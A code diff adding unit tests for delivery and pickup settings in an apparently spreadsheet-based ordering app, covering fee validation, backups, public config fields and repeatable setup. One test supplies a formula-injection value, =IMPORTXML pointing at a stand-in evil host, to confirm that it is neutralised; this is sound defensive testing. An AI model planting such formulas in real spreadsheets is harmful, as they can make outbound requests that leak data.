@@ -327,6 +327,98 @@ test('snapshot pode ser restaurado e cria nova revisao', () => {
   assert.equal(restored.config.brandName, 'Marca Antiga');
 });
 
+// ---- Etapa 9: entrega e retirada ----
+
+const fulfillmentData = (overrides = {}) => ({
+  fulfillment: {
+    pickupEnabled: true, deliveryEnabled: true, deliveryFee: '8.50',
+    pickupAddress: 'Endereço comercial fictício, 100', pickupInstructions: 'Retire das 9h às 12h.',
+    deliveryInstructions: 'Entregas a partir das 14h.', ...overrides
+  }
+});
+
+test('sem configuracao explicita a entrega fica desabilitada e a retirada habilitada', () => {
+  const fulfillment = createHarness().config().fulfillment;
+  assert.equal(fulfillment.pickupEnabled, true);
+  assert.equal(fulfillment.deliveryEnabled, false);
+  assert.equal(fulfillment.deliveryFeeCents, null);
+});
+
+test('dominio de entrega e retirada usa revisao, backup e centavos', () => {
+  const h = createHarness();
+  const result = h.context.saveConfigDomain_('fulfillment', fulfillmentData(), '1');
+  assert.equal(result.revision, '2');
+  assert.equal(result.config.fulfillment.deliveryEnabled, true);
+  assert.equal(result.config.fulfillment.deliveryFeeCents, 850);
+  assert.equal(result.config.fulfillment.pickupAddress, 'Endereço comercial fictício, 100');
+  const backup = h.sheets.get('_ConfigBackups').data[1];
+  assert.equal(backup[3], 'fulfillment');
+  assert.equal(backup[5], 'committed');
+  assert.equal(h.config().brandName, 'Marca Antiga', 'outros domínios não mudam');
+});
+
+test('nao permite desabilitar as duas modalidades', () => {
+  const h = createHarness();
+  assert.throws(() => h.context.saveConfigDomain_('fulfillment', fulfillmentData({ pickupEnabled: false, deliveryEnabled: false }), '1'),
+    error => error.code === 'FULFILLMENT_MODE_REQUIRED');
+  assert.equal(h.context.getConfigRevision_(), '1');
+});
+
+test('entrega exige taxa explicita, aceita zero e recusa valor invalido', () => {
+  const h = createHarness();
+  assert.throws(() => h.context.saveConfigDomain_('fulfillment', fulfillmentData({ deliveryFee: '' }), '1'),
+    error => error.code === 'DELIVERY_FEE_REQUIRED');
+  assert.throws(() => h.context.saveConfigDomain_('fulfillment', fulfillmentData({ deliveryFee: '-1' }), '1'),
+    error => error.code === 'INVALID_DELIVERY_FEE');
+  assert.equal(h.context.getConfigRevision_(), '1');
+  const free = h.context.saveConfigDomain_('fulfillment', fulfillmentData({ deliveryFee: '0' }), '1');
+  assert.equal(free.config.fulfillment.deliveryEnabled, true);
+  assert.equal(free.config.fulfillment.deliveryFeeCents, 0);
+});
+
+test('entrega marcada sem taxa na planilha permanece desabilitada', () => {
+  const h = createHarness();
+  h.sheets.get('Configuracoes').data.push(['deliveryEnabled', true], ['deliveryFee', '']);
+  assert.equal(h.config().fulfillment.deliveryEnabled, false);
+});
+
+test('textos de entrega sao neutralizados e limitados', () => {
+  const h = createHarness();
+  h.context.saveConfigDomain_('fulfillment', fulfillmentData({ pickupAddress: '=IMPORTXML("https://evil.example")' }), '1');
+  const row = h.rows('Configuracoes').find(item => item[0] === 'pickupAddress');
+  assert.equal(row[1], "'=IMPORTXML(\"https://evil.example\")");
+  assert.equal(h.config().fulfillment.pickupAddress, '=IMPORTXML("https://evil.example")');
+  assert.throws(() => h.context.saveConfigDomain_('fulfillment', fulfillmentData({ deliveryInstructions: 'x'.repeat(501) }), '2'),
+    error => error.code === 'FULFILLMENT_TEXT_TOO_LONG');
+});
+
+test('configuracao publica expoe somente dados comerciais de recebimento', () => {
+  const h = createHarness();
+  h.context.saveConfigDomain_('fulfillment', fulfillmentData(), '1');
+  const fulfillment = JSON.parse(JSON.stringify(h.context.getPublicConfig_().fulfillment));
+  assert.deepEqual(Object.keys(fulfillment).sort(), ['deliveryEnabled', 'deliveryFee', 'deliveryFeeCents', 'deliveryInstructions', 'pickupAddress', 'pickupEnabled', 'pickupInstructions']);
+});
+
+test('setupProject pode ser repetido: colunas e chaves sao acrescentadas sem sobrescrever', () => {
+  const h = createHarness();
+  const headers = h.context.PF ? h.context.PF.headers.Pedidos : vm.runInContext('PF.headers.Pedidos', h.context);
+  const legacyRow = ['PF-ANTIGO', 'x', 'Cliente', '349', 'd', '10:00', 'Chocolate', '', '', '', 89, 'PIX', '', 'Concluído', 'site', 1, 'f', 'committed'];
+  const orders = new FakeSheet('Pedidos', [headers.slice(0, 18), legacyRow], h.failures);
+  h.sheets.set('Pedidos', orders);
+  h.sheets.get('Configuracoes').data.push(['deliveryEnabled', true]);
+  for (let run = 0; run < 2; run += 1) {
+    h.context.ensureSheet_(h.spreadsheet, 'Pedidos', headers);
+    h.context.ensureConfigDefaults_(h.spreadsheet);
+  }
+  assert.equal(orders.data[0].length, 31);
+  assert.equal(orders.data[0][18], 'Modalidade de recebimento');
+  assert.deepEqual([...orders.data[1]], legacyRow);
+  const keys = h.rows('Configuracoes').map(row => row[0]);
+  assert.equal(keys.filter(key => key === 'pickupEnabled').length, 1);
+  assert.equal(keys.filter(key => key === 'deliveryEnabled').length, 1);
+  assert.equal(h.rows('Configuracoes').find(row => row[0] === 'deliveryEnabled')[1], true, 'valor existente preservado');
+});
+
 (async () => {
   let failed = 0;
   for (const { name, fn } of tests) {
